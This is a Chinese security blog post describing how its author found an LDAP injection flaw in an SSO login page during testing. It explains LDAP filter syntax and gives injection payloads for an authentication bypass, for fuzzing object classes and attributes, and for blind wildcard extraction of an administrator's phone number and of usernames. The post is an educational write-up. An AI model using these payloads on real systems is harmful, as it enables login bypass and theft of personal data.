                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="从一次漏洞挖掘入门ldap注入"><a href="#从一次漏洞挖掘入门ldap注入" class="headerlink" title="从一次漏洞挖掘入门ldap注入"></a>从一次漏洞挖掘入门ldap注入</h1><p>原文首发于先知:<a href="https://xz.aliyun.com/t/5689" target="_blank" rel="noopener">https://xz.aliyun.com/t/5689</a></p>
<p>在最近的一次测试中，随缘摸到了一个sso系统，留给前台的功能只有登陆。</p>
<p>没有验证码，但是登陆点强制要求每个用户更改强密码，而且除了管理员和测试账号其他大部分都是工号形式，所以不考虑撞库。直接fuzz一把梭</p>
<p>测试过程中发现username对于下面payload会存在两种不同回显<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d1fa1ac-a78a-1.png" alt="image_1dfitlu921a2l2qg1qlf1ulrpaom.png-64.6kB"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d715baa-a78a-1.png" alt="image_1dfito82tqcipm01gsb8vt87g13.png-70.4kB"></p>
<p>当时我并不理解这种payload是什么库的数据格式。但是看到存在”!”字符时，页面的回显是不同的，而”!”在绝大多数语言中都是取反的表达形式，自然会产生不同的布尔值，那么无疑就是个xxx注入点了</p>
<h1 id="何为LDAP"><a href="#何为LDAP" class="headerlink" title="何为LDAP"></a>何为LDAP</h1><p>通过payload的类型，看到是经典的ldap注入语句。一种老协议和数据存储形式了</p>
<h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p>LDAP(Lightweight Directory Access Protocol):即轻量级目录访问协议。是一种运行于TCP/IP之上的在线目录访问协议，主要用于目录中资源的搜索和查询。使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP</p>
<h2 id="LDAP存储"><a href="#LDAP存储" class="headerlink" title="LDAP存储"></a>LDAP存储</h2><p>MySQL数据库，数据都是按记录一条条记录存在表中。而LDAP数据库，是树结构的，数据存储在叶子节点上。</p>
<p>LDAP目录中的信息是按照树形结构组织的:</p>
<pre><code>dn:一条记录的位置
dc:一条记录所属的区域
ou:一条记录所属的组织
cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数据的查询。首先要说明是哪一棵树(dc)，然后是从树根到目标所经过的所有分叉(ou)，最后就是目标的名字(cn/uid)，借用一张图来表明结构如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4db2fcb8-a78a-1.png" alt="image_1dfivc13p1s9a19421h52facl6120.png-74.2kB"></p>
<h2 id="条目-amp-对象类-amp-属性"><a href="#条目-amp-对象类-amp-属性" class="headerlink" title="条目&amp;对象类&amp;属性"></a>条目&amp;对象类&amp;属性</h2><ul>
<li><p>条目(entry):是目录中存储的基本信息单元，上图每一个方框代表一个entry。一个entry有若干个属性和若干个值，有些entry还能包含子entry</p>
</li>
<li><p>对象类(obejectclass):对象类封装了可选/必选<strong>属性</strong>，同时对象类也是支持继承的。一个entry必须包含一个objectClass，且需要赋予至少一个值。而且objectClass有着严格的等级之分，最顶层是top和alias。例如，organizationalPerson这个objectClass就隶属于person，而person又隶属于top<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4df19b8a-a78a-1.png" alt="image_1dfj1uep3pjh32v1bbe1oop16jk2d.png-11.8kB"></p>
</li>
<li><p>属性(atrribute):顾名思义，用来存储字段值。被封装在objectclass里的，每个属性(attribute)也会分配唯一的OID号码</p>
</li>
</ul>
<h2 id="LDAP查询语句"><a href="#LDAP查询语句" class="headerlink" title="LDAP查询语句"></a>LDAP查询语句</h2><p>一个圆括号内的判断语句又称为一个过滤器filter。</p>
<pre><code>( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></pre><h3 id="逻辑与-amp"><a href="#逻辑与-amp" class="headerlink" title="逻辑与&amp;"></a>逻辑与&amp;</h3><pre><code>(&amp;(username=Hpdoger)(password=ikun))</code></pre><p>查找name属性为Hpdoger并且password属性值为ikun的所有条目</p>
<h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或|"></a>逻辑或|</h3><pre><code>(|(username=Hpdoger)(displayname=Hpdoger))</code></pre><p>查找username或者displayname为Hpdoger的所有条目</p>
<h3 id="特殊说明"><a href="#特殊说明" class="headerlink" title="特殊说明"></a>特殊说明</h3><p>除使用逻辑操作符外，还允许使用下面的单独符号作为两个特殊常量</p>
<pre><code>(&amp;)     -&gt;Absolute TRUE 
(|)     -&gt;Absolute FALSE 
*       -&gt;通配符</code></pre><p>另外，默认情况下，LDAP的DN和所有属性都不区分大小写，即在查询时：</p>
<pre><code>(username=Hpdoger) &lt;=&gt; (username=HPDOGER)</code></pre><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>由于LDAP的出现可以追溯到1980年，关于它的漏洞也是历史悠久。LDAP注入攻击和SQL注入攻击相似，利用用户引入的参数生成LDAP查询。攻击者构造恶意的查询语句读取其它数据/跨objectclass读取属性，早在wooyun时代就有师傅详细的剖析了这类漏洞。</p>
<p>上文说到LDAP过滤器的结构和使用得最广泛的LDAP：ADAM和OpenLDAP。然而对于下面两种情况</p>
<h2 id="无逻辑操作符的注入"><a href="#无逻辑操作符的注入" class="headerlink" title="无逻辑操作符的注入"></a>无逻辑操作符的注入</h2><p>情景：<code>(attribute=$input)</code></p>
<p>我们构造输入:<code>$input=value)(injected_filter</code></p>
<p>代入查询的完整语句就为:</p>
<pre><code>(attribute=value)(injected_filter)</code></pre><p>由于一个括号内代表一个过滤器，在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的。</p>
<p>因而这类情况仅对于OpenLDAP有一定的影响。</p>
<p>例如我们要想查询一个字段是否存在某值时，可以用<code>$input=x*</code>进行推移，利用页面响应不同判断x*是否查询成功</p>
<h2 id="带有逻辑操作符的注入"><a href="#带有逻辑操作符的注入" class="headerlink" title="带有逻辑操作符的注入"></a>带有逻辑操作符的注入</h2><pre><code>(|(attribute=$input)(second_filter))
(&amp;(attribute=$input)(second_filter))</code></pre><p>此时带有逻辑操作符的括号相当于一个过滤器。此时形如value)(injected_filter)的注入会变成如下过滤器结构</p>
<pre><code>(&amp;(attribute=value)(injected_filter))(second_filter)</code></pre><p>虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p>
<p>举个最简单的登陆注入的例子，如果验证登陆的查询语句是这样:</p>
<pre><code>(&amp;(USER=$username)(PASSWORD=$pwd)) </code></pre><p>输入$username = <code>admin)(&amp;)(</code>使查询语句变为</p>
<pre><code>(&amp;(USER=admin)(&amp;))((PASSWORD=$pwd)) </code></pre><p>即可让后面的password过滤器失效，执行第一个过滤器而返回true，达到万能密码的效果。</p>
<h2 id="后注入分析"><a href="#后注入分析" class="headerlink" title="后注入分析"></a>后注入分析</h2><p>注入大致分为and、or类型这里就不赘述，感兴趣的可以看之前wooyun的文章：<br><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p>
<p>还有一个joomla的一个userPassword注入实例:<br><a href="https://www.anquanke.com/post/id/86899" target="_blank" rel="noopener">Joomla! LDAP注入导致登录认证绕过漏洞</a></p>
<h1 id="回到实例"><a href="#回到实例" class="headerlink" title="回到实例"></a>回到实例</h1><p>大致了解注入类型，就开始了第一轮尝试</p>
<p>当通配符匹配到用户名时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132647-4e7d6dae-a78a-1.png" alt="image_1dfj9gu7f1d261ad2o9jao3q082q.png-40.1kB"></p>
<p>用户名不存在时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ecb7d3c-a78a-1.png" alt="image_1dfj9iml33968bod9etnogsu3n.png-49.7kB"></p>
<p>构造用户名恒真<code>username=admin)(%26&amp;password=123</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ee14e8c-a78a-1.png" alt="image_1dfj9mj071drl59b37j21teu544.png-49.7kB"></p>
<p>说明它判断用户的形式并不是<code>(&amp;(USER=$username)(PASSWORD=$pwd))</code>，因为我们查到的用户名是true，但是验证密码false</p>
<p>由于自己也没搞过LDAP的开发..就盲猜后端应该就是这种情况:<br>执行了<code>(&amp;(USER=$username)(objectclass=xxx))</code>后，取password与$password进行对比</p>
<h2 id="ACTION"><a href="#ACTION" class="headerlink" title="ACTION"></a>ACTION</h2><p>那么首先要知道它继承了哪些objectclass？因为树结构都有根，使我们能顺藤摸瓜。首先是top肯定存在，回显如下:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4f4b148e-a78a-1.png" alt="image_1dfje9v39cu01n95u4fqln1ed9.png-36.9kB"></p>
<p>但是top的子类太多了，先fuzz一下objectclass的值缩小范围，payload：</p>
<pre><code>username=admin)(objectclass%3d$str</code></pre><p>发现存在<strong>person</strong>和<strong>user</strong>两个objectclass</p>
<p>再fuzz一下attribute得到的值如下:</p>
<pre><code>username=admin)($str%3d*</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-4ff6ba6e-a78a-1.png" alt="image_1dfjehfm71qa71ri11b481mj9183m.png-80.2kB"></p>
<p>凭借这些信息去LDAP文档里溯继承链，先去找user类，继承自organizationalPerson<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-5033cd5a-a78a-1.png" alt="image_1dfjeub3c1dfvnb5dv6k61i7l13.png-67.3kB"></p>
<p>同理organizationalperson又是继承自person的，person继承自top，最终的继承链为：</p>
<pre><code>top-&gt;person-&gt;organizationalperson-&gt;user</code></pre><p>也就是说这些类存在的属性都可能被调用。很遗憾的是我并没有fuzz到password类型参数，一般来说password会以userPassword的形式存储在person对象中，很多基于ldap的开发demo中也是这样写的。</p>
<p>但是userPassword毕竟也只是person类可选的属性，开发大概率是改名或者重写属性了，这也是这个漏洞没有上升到严重危害的瓶颈点<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-50554700-a78a-1.png" alt="image_1dfki06dp1sqm147onc11odt3at13.png-127.9kB"></p>
<p>不过依然可以注出一些有用的数据。例如所有用户的用户名、邮箱、手机号、姓名、性别等等，说不定以后可以越权修改某账号性别呢-3-</p>
<h3 id="盲注mobile"><a href="#盲注mobile" class="headerlink" title="盲注mobile"></a>盲注mobile</h3><p>尝试注入管理员的手机号mobile</p>
<pre><code>username=admin)(mobile=%s*&amp;password=123</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50b0e8f8-a78a-1.png" alt="image_1dfkgoopj19s4kkkq0sulvmp4m.png-52.6kB"></p>
<p>利用通配符不断添加数字，同理邮箱也可以注出来，与sql盲注的思路相同。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50c968d8-a78a-1.png" alt="image_1dfl7ap4k1pna18bk17ec24166o2n.png-42.3kB"></p>
<h3 id="盲注username"><a href="#盲注username" class="headerlink" title="盲注username"></a>盲注username</h3><p>毕竟对于sso，收集username是很有用的信息。那么问题来了，我们是可以通过生成字典来遍历存在的用户名，但是这个工作量是指数倍的增长，一天能跑完一个字母开头的就不错了，而且浪费了通配符的作用。</p>
<p>可是又想做到无限迭代把所有用户一个不漏的跑完，passer6y师傅提醒我用笛卡尔积</p>
<p>最后画出来的流程图大致如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-512168da-a78a-1.png" alt="image_1dfkks6d86j6ra51m7821d3831g.png-87.6kB"></p>
<p>最后测试用户大概有1w多，然而这些大部分是测试帐号，未授权的情况下也不能跑具体数据，但也算是验证了思路的可执行性。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>网上关于这类漏洞的fuzz思路也比较久远了，第一次接触这种漏洞，若文章思路如果有什么不对的地方还请师傅们斧正。自己对这类漏洞的姿势理解很浅，现在漏洞已经修复，但是如果有师傅对于password的注入有想法，可以私下交流一下</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</a><br><a href="https://www.cnblogs.com/pycode/p/9495808.html" target="_blank" rel="noopener">https://www.cnblogs.com/pycode/p/9495808.html</a><br><a href="https://zhuanlan.zhihu.com/p/32732045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32732045</a></p>

                
            </div>
            <div class="continue">
            <a href="/2019/08/13/从一次漏洞挖掘入门ldap注入/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>